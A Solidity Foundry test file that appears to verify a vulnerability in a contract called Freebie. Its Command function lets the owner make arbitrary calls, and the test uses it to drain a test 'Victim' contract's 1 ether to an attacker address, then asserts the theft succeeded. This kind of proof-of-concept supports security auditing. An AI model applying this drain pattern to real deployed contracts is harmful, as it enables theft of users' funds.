// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol";

contract Victim {
    constructor() payable {}

    function transferTo(address payable to) public {
        to.transfer(address(this).balance);
    }
}

contract FreebieTest is Test {
    Freebie public freebie;
    address owner = address(1);
    address attacker = address(2);

    function setUp() public {
        vm.startPrank(owner);
        freebie = new Freebie();
        vm.stopPrank();
    }

    function testCommandVulnerability() public {
        // Deploy Victim contract with 1 ether
        Victim victim = new Victim{value: 1 ether}();

        // Record initial balances
        uint256 initialVictimBalance = address(victim).balance;
        uint256 initialAttackerBalance = attacker.balance;

        console.log("--- BEFORE-Trigger Balance State ---");
        console.log("Victim balance: %d wei", initialVictimBalance);
        console.log("Attacker balance: %d wei", initialAttackerBalance);

        console.log("--- Trigger Command Call ---");
        bytes memory data = abi.encodeWithSignature("transferTo(address)", attacker);
        vm.prank(owner);
        freebie.Command{value: 0}(address(victim), data);
        
        console.log("--- AFTER-Trigger Balance State ---");
        uint256 afterVictimBalance = address(victim).balance;
        uint256 afterAttackerBalance = attacker.balance;
        console.log("Victim balance: %d wei", afterVictimBalance);
        console.log("Attacker balance: %d wei", afterAttackerBalance);

        // Differential validation
        console.log("--- Vulnerability Verification ---");
        bool victimDrained = (afterVictimBalance == 0);
        bool fundsTransferred = (afterAttackerBalance == initialAttackerBalance + initialVictimBalance);
        bool exploited = victimDrained && fundsTransferred;

        if (exploited) {
            console.log("Vulnerability confirmed: Funds successfully transferred from victim to attacker");
            console.log("Vulnerability Exists: Owner abused Command function to drain victim contract");
        } else {
            console.log("Vulnerability not confirmed: Unexpected balance changes detected");
            console.log("Vulnerability not Exist: State changes do not match expected exploit pattern");
        }

        assertEq(
            afterVictimBalance, 
            0, 
            "Victim contract should be drained"
        );
        assertEq(
            afterAttackerBalance, 
            initialAttackerBalance + initialVictimBalance, 
            "Attacker should receive stolen funds"
        );
    }
}